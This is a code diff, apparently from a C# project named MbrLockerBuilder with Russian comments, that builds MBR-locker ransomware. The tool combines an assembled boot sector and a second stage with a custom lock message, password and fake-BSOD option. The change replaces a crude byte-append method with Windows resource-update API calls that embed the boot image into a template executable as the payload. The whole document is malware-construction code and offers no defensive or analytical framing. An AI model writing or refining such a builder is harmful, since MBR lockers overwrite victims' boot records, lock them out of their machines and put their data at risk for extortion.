@@ -5,11 +5,22 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Text;
 using System.Reflection;
+using System.Runtime.InteropServices;
 
 namespace MbrLockerBuilder
 {
     public class MainForm : Form
     {
+        // WinAPI для работы с ресурсами
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, byte[] lpData, uint cbData);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
+
         private TextBox txtTitle, txtBody, txtPassword;
         private ComboBox cmbTextColor, cmbBgColor;
         private CheckBox chkBSOD;
@@ -345,10 +356,9 @@ namespace MbrLockerBuilder
                 Array.Copy(mbrBytes, 0, fullImage, 0, 512);
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
 
-                this.lblStatus.Text = "5/7 Добавление ресурса...";
+                this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
 
-                // Создаём ресурс "MBR" в template.exe
                 byte[] templateBytes = FindResourceBytesByPartialName("template");
                 if (templateBytes == null)
                 {
@@ -362,7 +372,33 @@ namespace MbrLockerBuilder
                 this.lblStatus.Text = "6/7 Встраивание MBR как ресурс...";
                 Application.DoEvents();
 
-                byte[] payloadBytes = AddResource(templateBytes, "MBR", fullImage);
+                // Сохраняем template во временный файл
+                string tempTemplatePath = Path.Combine(Path.GetTempPath(), "template_temp.exe");
+                File.WriteAllBytes(tempTemplatePath, templateBytes);
+
+                // Добавляем ресурс через WinAPI
+                string outputPath = Path.Combine(Path.GetTempPath(), "payload_temp.exe");
+                File.Copy(tempTemplatePath, outputPath, true);
+
+                IntPtr hUpdate = BeginUpdateResource(outputPath, false);
+                if (hUpdate == IntPtr.Zero)
+                    throw new Exception("Не удалось открыть файл для обновления ресурсов!");
+
+                // Добавляем ресурс "MBR" типа "BINARY"
+                if (!UpdateResource(hUpdate, "BINARY", "MBR", 0, fullImage, (uint)fullImage.Length))
+                {
+                    EndUpdateResource(hUpdate, true);
+                    throw new Exception("Не удалось добавить ресурс MBR!");
+                }
+
+                if (!EndUpdateResource(hUpdate, false))
+                    throw new Exception("Не удалось сохранить файл!");
+
+                byte[] payloadBytes = File.ReadAllBytes(outputPath);
+
+                // Чистим временные файлы
+                try { File.Delete(tempTemplatePath); } catch { }
+                try { File.Delete(outputPath); } catch { }
 
                 this.lblStatus.Text = "7/7 Сохранение...";
                 Application.DoEvents();
@@ -415,36 +451,12 @@ namespace MbrLockerBuilder
                 throw new Exception("NASM Error: " + nasm.StandardError.ReadToEnd());
         }
 
-        private byte[] AddResource(byte[] template, string resourceName, byte[] resourceData)
-        {
-            // Простой метод: добавляем маркер в конец файла
-            // В реальном билдере нужно использовать BeginUpdateResource/UpdateResource
-            
-            // Ищем маркер "MBR" в template
-            byte[] marker = Encoding.ASCII.GetBytes("MBR");
-            int markerPos = FindPattern(template, marker);
-            
-            if (markerPos == -1)
-                throw new Exception("Маркер 'MBR' не найден!");
-            
-            // Создаём новый файл с ресурсом
-            byte[] result = new byte[template.Length + 4 + resourceData.Length];
-            Array.Copy(template, 0, result, 0, template.Length);
-            
-            // Добавляем маркер и данные в конец
-            Array.Copy(marker, 0, result, template.Length, 4);
-            Array.Copy(resourceData, 0, result, template.Length + 4, resourceData.Length);
-            
-            return result;
-        }
-
         private string GenerateMBR()
         {
             string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
             if (File.Exists(localPath))
                 return File.ReadAllText(localPath);
 
-            // Встроенный fallback
             return @"
 BITS 16
 ORG 0x7C00
@@ -662,24 +674,6 @@ dw 0xAA55";
                 this.lblStatus.Text = $"Ошибка: {ex.Message}";
                 return null;
             }
-        }
-
-        private int FindPattern(byte[] data, byte[] pattern)
-        {
-            for (int i = 0; i <= data.Length - pattern.Length; i++)
-            {
-                bool found = true;
-                for (int j = 0; j < pattern.Length; j++)
-                {
-                    if (data[i + j] != pattern[j])
-                    {
-                        found = false;
-                        break;
-                    }
-                }
-                if (found) return i;
-            }
-            return -1;
         }
     }
 }
